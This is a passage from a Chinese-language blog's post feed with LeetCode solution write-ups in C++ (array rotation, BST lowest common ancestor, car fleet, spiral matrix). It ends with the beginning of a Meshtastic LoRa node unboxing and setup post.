[1,2,3,4,5]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>那如果 <code>k=i</code> 就代表要從第 <code>n-k</code> 個元素開始取，直到 <code>n-1</code>。 因此後面宣告一個暫存陣列，來去存放尾端元素。接著需要移動剩下元素往後面擠。最後就是把暫存陣列 <code>temp</code> 當中的值放到首端剛剛空出的空位裡。這樣就完成旋轉了。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/189/result.png"></p><h2 id="O-1-空間複雜度的做法"><a href="#O-1-空間複雜度的做法" class="headerlink" title="$O(1)$ 空間複雜度的做法"></a>$O(1)$ 空間複雜度的做法</h2><p>只能說這個做法挺酷，其前面一樣會是對 <code>k</code> 取餘數，但這時候他會去把陣列翻轉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[1,2,3,4,5,6,7]</span><br><span class="line">↓</span><br><span class="line">[7,6,5,4,3,2,1]</span><br></pre></td></tr></table></figure><p>這時候我們原先想要取出的末端元素就會在首端，並且此時會發現 <code>k</code> 即為我們之前計算時的插入點，原先會是 <code>n-k</code> 但反過來就會會是在位置 <code>k</code>。所以可以分成 <code>k</code> 之前跟 <code>k</code> 之後兩個區域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     k</span><br><span class="line">[7,6,5,4,3,2,1]</span><br><span class="line"> # # * * * * *</span><br></pre></td></tr></table></figure><p>接著只要把 <code>k</code> 之後跟之前的所有元素再度個別翻轉，就會得到我們要的旋轉後的陣列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">     k</span><br><span class="line">[7,6,5,4,3,2,1]</span><br><span class="line"> # # * * * * *</span><br><span class="line">↓</span><br><span class="line">     k</span><br><span class="line">[6,7,1,2,3,4,5]</span><br><span class="line"> # # * * * * *</span><br></pre></td></tr></table></figure><p>實際步驟超簡單</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        k = k % n;</span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">reverse</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">reverse</span>(nums.<span class="built_in">begin</span>()+k, nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">reverse</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">begin</span>()+k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度<br>$O(n)$</p><p>空間複雜度<br>$O(k)$ 會多使用等同於尾端元素 <code>k</code> 大小空間</p><p>第二中做法的空間複雜度會是 $O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BST的最小共同祖先(LCA) | Medium | LeetCode#235. Lowest Common Ancestor of a Binary Search Tree</title>
      <link href="/posts/6a04863.html"/>
      <url>/posts/6a04863.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/235/question.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述：給定一個BST, 求在BST內任意兩節點的最小共同祖先，其中自己可以是自己的祖先，求任意兩節點 <code>p</code>, <code>q</code> 的LCA</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>首先一定是先 traversal 查找 <code>p</code>, <code>q</code> 兩節點，而我的想法是，如果用 post-traversal 來走訪測資一，這樣對於任意兩節點，假設是 <code>3</code>,或是 <code>5</code> 這兩個元素的 caller(當前遞迴節點) 會是 <code>4</code>，而對於 <code>5</code> 或是 <code>7</code> 這兩個的caller會是節點 <code>6</code>。因此其實就是要找同時具有 <code>p</code>跟<code>q</code>節點返回值的那層 caller 就會是 LCA</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (root == p || root == q) <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">    TreeNode *leftNode = <span class="built_in">lowestCommonAncestor</span>(root-&gt;left, p, q);</span><br><span class="line">    TreeNode *rightNode = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right, p, q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (leftNode != <span class="literal">nullptr</span> &amp;&amp; rightNode != <span class="literal">nullptr</span>)  <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">if</span>(leftNode != <span class="literal">nullptr</span>) <span class="keyword">return</span> leftNode;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> rightNode; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (root == p || root == q) <span class="keyword">return</span> root;</span><br></pre></td></tr></table></figure><p>上面可以看到，如果traverse 找到 <code>p</code> 或者 <code>q</code> 則直接返回。</p><p>如果同時找到 <code>leftNode</code> 跟 <code>rightNode</code> 則當前節點就是LCA，而如果只有其中一個節點返回，那當前節電同時會是 <code>p</code> 或 <code>q</code> 並且自己就是自己的祖先</p><p>但是上面這種做法其實不限於 BST, 其他 binary tree 也能用，如果是 BST 其實不用那麼麻煩，因為已經排序好了，而且BST本來就是設計來讓你找節點用的:</p><ul><li><code>p、q</code> 都比 <code>root</code> 小 → 走左</li><li><code>p、q</code> 都比 <code>root</code> 大 → 走右</li></ul><p>而其他狀況root都是LCA:</p><ul><li>root 本來就是 q 或 p</li><li><code>q &lt; root  &lt; p</code></li><li><code>p &lt; root  &lt; q</code></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)<span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val &gt; p-&gt;val &amp;&amp; root-&gt;val &gt; q-&gt;val) <span class="keyword">return</span> <span class="built_in">lowestCommonAncestor</span>(root-&gt;left, p, q);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt; val &lt; p-&gt;val &amp;&amp; root-&gt;val &lt; q-&gt;val) <span class="keyword">return</span> <span class="built_in">lowestCommonAncestor</span>(root-&gt;right, p, q);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> root; <span class="comment">// when root is q or p</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/235/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度<br>$O(LogN)$ -&gt; 二元查找<br>空間複雜度<br>$O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Binary Search Tree </tag>
            
            <tag> Linked List </tag>
            
            <tag> LCA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>車隊 | Medium | LeetCode#853. Car Fleet</title>
      <link href="/posts/8a24439e.html"/>
      <url>/posts/8a24439e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/853/question.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 本題給定 <code>n</code> 個車輛，其中每輛車需要抵達到終點位置 <code>target</code>，第 <code>i</code> 輛車的位置為 <code>position[i]</code> 第 <code>i</code> 輛車的速度為 <code>speed[i]</code>，題目中有個規定 <strong>輛車不得超越另一輛車，只能保持相同速度行駛</strong>，也就是說如果後車比前車快，那後車只能降速，降到與前車同等速度一同行駛，這樣就形成一個兩輛車行駛的車隊，題目中另外還有說明，<strong>單獨一輛車也算是車隊的一部份</strong>，題目最終要求，請計算共有多少車隊會抵達終點。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>核心想法我覺得是首先， <strong>要能夠記錄每輛車當前的位置</strong> ，並且會需要知道每輛車速度與位置之間的關係。但我一開始的想法比較複雜，就是用 pair 或 hasp table 紀錄車輛當前位置跟速度，每一小時就更新車輛位置跟速度，一旦有車隊抵達終點後就不再更新那幾輛車，但這樣可能會有多重迴圈，並且需要額外紀錄是否抵達終點。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function"><span class="type">int</span> <span class="title">carFleet</span><span class="params">(<span class="type">int</span> target, vector&lt;<span class="type">int</span>&gt;&amp; position, vector&lt;<span class="type">int</span>&gt;&amp; speed)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = position.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">double</span>&gt;&gt; <span class="built_in">cars</span>(n);</span><br><span class="line">        <span class="type">double</span> timeToTravel;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">            timeToTravel = (<span class="type">double</span>)(target - position[i]) /(<span class="type">double</span>)speed[i];</span><br><span class="line">            cars[i] =&#123;position[i],timeToTravel&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">sort</span>(cars.<span class="built_in">begin</span>(), cars.<span class="built_in">end</span>());</span><br><span class="line">    stack&lt;<span class="type">double</span>&gt; fleetStack;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(fleetStack.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            fleetStack.<span class="built_in">push</span>(cars[i].second);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(cars[i].second &gt; fleetStack.<span class="built_in">top</span>())&#123;</span><br><span class="line">                fleetStack.<span class="built_in">push</span>(cars[i].second);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>)fleetStack.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這題的重點在於：每輛車抵達終點所需的時間 &#x3D; <strong>(target - position) &#x2F; speed</strong> 。我們不需要真的去模擬車子的移動，只要算出 <strong>到達終點的時間</strong>，就能判斷會不會形成車隊。 舉例來說，若時間陣列為 <code>[1, 1, 3, 5]</code>：</p><ul><li>前兩台車到達時間相同 → 在終點會「同時」抵達，因此算一個車隊。</li><li>第三台車需要 3 小時，前面兩台只需要 1 小時，代表第三台絕對追不上前面 → 形成新車隊。</li><li>第四台車需要 5 小時，比第三台更慢，因此它也不會追上第三台 → 再形成新車隊。</li></ul><p>由此可知，每一個 <strong>比前車更久的時間</strong> 會開啟一個新的車隊</p><p>因此只要能夠先由迭代每輛車距離終點還要多久時間，就能夠知道會有多少車隊，這個車輛所需時間就可以放在 stack 當中。 <strong>可以迭代每輛車檢查，如果有車的所需時間比前車少，那就代表他速度更快，需要降速，因此stack內元素不變。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stack:                          |    5    |</span><br><span class="line">                |   3   |       |    3    |</span><br><span class="line">|  1  |    -&gt;   |   1   |   -&gt;  |    1    |</span><br><span class="line">|_____|         |_______|       |_________|</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>這樣我們就能夠知道 <strong>抵達終點時的車隊數量燈同於 stack 內元素數量</strong></p><p>所以在程式碼中，首先需要計算每輛車抵達終點的花費時間，透過一個迴圈來計算，那為了避免整數除不盡，需要用 double 型別來儲存時間，並且需要把當前汽車位置以及所需時間綁定起來，可以透過宣告 <code>pair</code> 物件來去儲存。</p><p>題目描述中，車輛可能分散在道路上。為了知道「誰在誰前面」，我們必須依 <strong>位置由大到</strong>  排序，確保我們能從最接近終點的車開始處理，但 <code>sorted</code> 預設是由小到大，所以知道迭代要從 <code>n-1</code> 開始迭代。</p><p>之後宣告stack <code>fleetStack</code>,利用 stack 來判斷車隊數量</p><ul><li>從最右邊（接近終點）的車開始往左掃</li><li>若當前車的抵達時間 大於 stack 頂端時間，代表追不上 → 新車隊</li><li>否則，時間小於等於 stack 頂端，代表會被併入 → 不新增車隊</li></ul><p>而答案就會是 stack 大小</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/853/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度-O-n-空間複雜的-O-n"><a href="#時間複雜度-O-n-空間複雜的-O-n" class="headerlink" title="時間複雜度$O(n)$空間複雜的$O(n)$"></a>時間複雜度<br>$O(n)$<br>空間複雜的<br>$O(n)$</h2>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>螺旋矩陣 | Medium | LeetCode#54. Spiral Matrix</title>
      <link href="/posts/3d362b68.html"/>
      <url>/posts/3d362b68.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/54/question.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 給定一個 <code>m x n</code> 的 <code>matrix</code>，請以螺旋順序回傳 <code>matrix</code> 內的所有元素</li></ul><blockquote><p>看題目的範例應該是要用順時鐘方向然後由外而內來螺旋</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始看到，想說應該要能夠用遞迴方式來逐一存取特定的格子，可能指定 row 跟 column 然後要想某種方式來每次都跑完一層後轉向，但我後來發現這樣的判斷方式會太複雜，因為我原本的想法是每一層遞回要跑一個螺旋邊 (Ex. 最上層的元素依序存入輸出vector) 但這樣遞迴終止條件會太複雜，用來控制轉向的參數也會太多。 <strong>後來改成將四個螺旋邊的存取放在相同的遞迴中，螺旋到內圈時才會進到下一層遞迴。</strong></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;output;    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">helper</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp; matrix, <span class="type">int</span> top, <span class="type">int</span> bottom, <span class="type">int</span> left, <span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(top &gt; bottom || left &gt; right) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=left; j&lt;=right; j++)&#123;</span><br><span class="line">            output.<span class="built_in">push_back</span>(matrix[top][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=top+<span class="number">1</span>; i&lt;= bottom; i++)&#123;</span><br><span class="line">            output.<span class="built_in">push_back</span>(matrix[i][right]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(top &lt; bottom)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=right<span class="number">-1</span>; j&gt;=left; j--)&#123;</span><br><span class="line">                output.<span class="built_in">push_back</span>(matrix[bottom][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(left &lt; right)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=bottom<span class="number">-1</span>; i&gt;top;i--)&#123;</span><br><span class="line">                output.<span class="built_in">push_back</span>(matrix[i][left]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">helper</span>(matrix, top+<span class="number">1</span>, bottom<span class="number">-1</span>, left+<span class="number">1</span>,right<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">spiralOrder</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m= matrix.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n= matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">helper</span>(matrix, <span class="number">0</span>, m<span class="number">-1</span>, <span class="number">0</span>, n<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這邊額外定義了一個 <code>helper</code> 函數主要負責透過遞迴進行螺旋存取的任務，但是這邊會有四個參數 <code>left</code>, <code>right</code>, <code>top</code>, <code>bottom</code>  主要是用來調整矩陣範圍用的，在 <code>sprialOrder</code> 會先取出矩陣的長 <code>m</code> 跟寬 <code>n</code> 然後將其各自減一作為 <code>right</code> 跟 <code>bottom</code> 的值丟入 <code>helper</code> 函式中。 </p><p>由於矩陣的存取方式會是順時針螺旋，那在 <code>helper</code> 函式中就需要按照螺旋的規律來去依序存取，所以 </p><p>(1) 從上邊由左至右存取陣列</p><p><img src="/img/LeetCode/54/Array-1.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=left; j&lt;=right; j++)&#123;</span><br><span class="line">    output.<span class="built_in">push_back</span>(matrix[top][j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(2) 從右邊由上至下存取陣列</p><p><img src="/img/LeetCode/54/Array-2.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=top+<span class="number">1</span>; i&lt;= bottom; i++)&#123;</span><br><span class="line">    output.<span class="built_in">push_back</span>(matrix[i][right]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(3) 從下邊由右至左存取陣列</p><p><img src="/img/LeetCode/54/Array-3.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(top &lt; bottom)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=right<span class="number">-1</span>; j&gt;=left; j--)&#123;</span><br><span class="line">        output.<span class="built_in">push_back</span>(matrix[bottom][j]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(4) 從左邊由下至上存取陣列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(left &lt; right)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=bottom<span class="number">-1</span>; i&gt;=top; i--)&#123;</span><br><span class="line">        output.<span class="built_in">push_back</span>(matrix[i][left]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這邊說明一下，在 <code>helper</code> 中的 終止條件 <code>if(top &gt; bottom || left &gt; right) return;</code> 是在整圈都不能走的時候才停止，但在剛剛的下邊跟左邊（也就是第三步驟跟第四步驟），之所以在走訪下邊會需要先判斷 <code>if(top &lt; bottom)</code> 是因為這樣才有下邊可以走，如果等於了，那就會是走到重複的邊 (走會是走剛剛的上邊)，所以要確定下面有路可以走才開始由下邊的最右走到下邊的最左，同理，你要確定最左邊有路才能走 <code>if(left &lt; right)</code> 如果沒路你就會是走剛剛走過的最右邊。 <strong>這些判斷的目的是避免在剩下一行或一列時重複走訪已經走過的邊界。</strong></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/54/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度: $O(mn)$ $m$ $n$ 矩陣中的每個元素都會被存取一次 (每一層迴圈的加總)</p><p>空間複雜度: output陣列會是 $O(mn)$ 然後遞迴深度會是 $O(min(m,n)&#x2F;2)$ 但 $O(min(m,n)) &lt; O(mn)$ </p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Matrix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>開箱+基本設定 | 入坑 Meshtastic 開源專案 | Meshtastic 系列</title>
      <link href="/posts/34e84285.html"/>
      <url>/posts/34e84285.html</url>
      
        <content type="html"><![CDATA[<p><img src="/img/mesh/banner.png"></p><div class="note info flat"><p>🔋 <strong>基本介紹：</strong> <a href="https://hackmd.io/@BASHCAT/S1m_x-AOA/%2FUAmGpkIzQy-Fc5xKmcyBtQ">https://hackmd.io/@BASHCAT/S1m_x-AOA/%2FUAmGpkIzQy-Fc5xKmcyBtQ</a><br>🔋 <strong>Official Web Page:</strong> <a href="https://meshtastic.org/docs/about/">https://meshtastic.org/docs/about/</a><br>🔋 <strong>Useful Videos:</strong> </p><ul><li><a href="https://youtu.be/6hW40yaj3x4?si=rGFPADhNIWfiZnL8">https://youtu.be/6hW40yaj3x4?si=rGFPADhNIWfiZnL8</a></li><li><a href="https://youtu.be/x99R78fkSg0?si=cU1XbtR8HUWploHr">https://youtu.be/x99R78fkSg0?si=cU1XbtR8HUWploHr</a></li></ul><p>🔋 <strong>FB- 臺灣鏈網</strong>  <a href="https://www.facebook.com/groups/meshtastictw/about">https://www.facebook.com/groups/meshtastictw/about</a><br>🔋 <strong>Reddit 討論串</strong>  <a href="https://www.reddit.com/r/meshtastic/">https://www.reddit.com/r/meshtastic/</a></p></div><h1 id="什麼是-Meshtastic"><a href="#什麼是-Meshtastic" class="headerlink" title="什麼是 Meshtastic?"></a>什麼是 Meshtastic?</h1><p>基於 <strong><a href="https://zh.wikipedia.org/zh-tw/LoRa">LoRa</a></strong> 的無線通訊技術的開源專案，可以透過LoRa相關設備透過 LoRa 協定進行低功耗遠距離的無線訊號傳輸，並且不仰賴現有的行動通訊架構，適合類似 <strong>緊急備援用的通訊系統，或是山區救援通訊。</strong></p><p>藉由 Meshtastic 節點，訊息由設備發送出，只要抵達其他節點，消息就可以轉送到其他節點上。</p><p>另外，台灣目前 (2025&#x2F;07&#x2F;13) 已經有許多節點由民間自行建立，低成本並且門檻並不高，還不需要像手持無線電一樣考取證照</p><p><img src="/img/mesh/nodes.png"></p><h1 id="設備購買"><a href="#設備購買" class="headerlink" title="設備購買"></a>設備購買</h1><p>我觀察不論是台灣鏈網或是Redit上大多都是以 Heltic 的 v3 作為入門選擇，但好像功耗也是常被人詬病的一點，後來我選擇購買了「貌似」較為節省功耗的 Heltic T1114v2 作為初始入門的版子 (還不確定這選擇正不正確)，我是直接從 Heltic 官方賣場買的，順便附上 <a href="https://heltec.cashier.ecpay.com.tw/product/000000000781598">賣場連結</a> 但也是有人選擇從掏寶購買，這就看個人選擇了~。</p><blockquote><p><a href="https://www.reddit.com/r/meshtastic/comments/1ewbtgy/heltec_mesh_node_t114_first_look/">https://www.reddit.com/r/meshtastic/comments/1ewbtgy/heltec_mesh_node_t114_first_look/</a></p></blockquote><h1 id="開箱-Heltic-T114"><a href="#開箱-Heltic-T114" class="headerlink" title="開箱 Heltic T114"></a>開箱 Heltic T114</h1><p>我是一次就買了板子+天線以及轉接線材 (但後來爬文看普遍大家都會換更好的天線跟SMA轉接線)，並且還有GPS模組 (但聽說掏寶上的真的沒那麼貴?)</p><p><img src="/img/mesh/heltec.jpg"></p><p>欣賞完畢後，在正式燒錄韌體之前，養成好習慣，務必要先把天線插在板子上，射頻設備在沒有天線的時候開機或運作有機會損壞元件。將 Heltec T1114 插上轉接線以及原廠附贈的天線後，就可以插上電源進行韌體燒錄了。</p><h1 id="燒錄韌體"><a href="#燒錄韌體" class="headerlink" title="燒錄韌體"></a>燒錄韌體</h1><div class="note warning flat"><p>請選擇具有資料傳輸功能的USB Type C 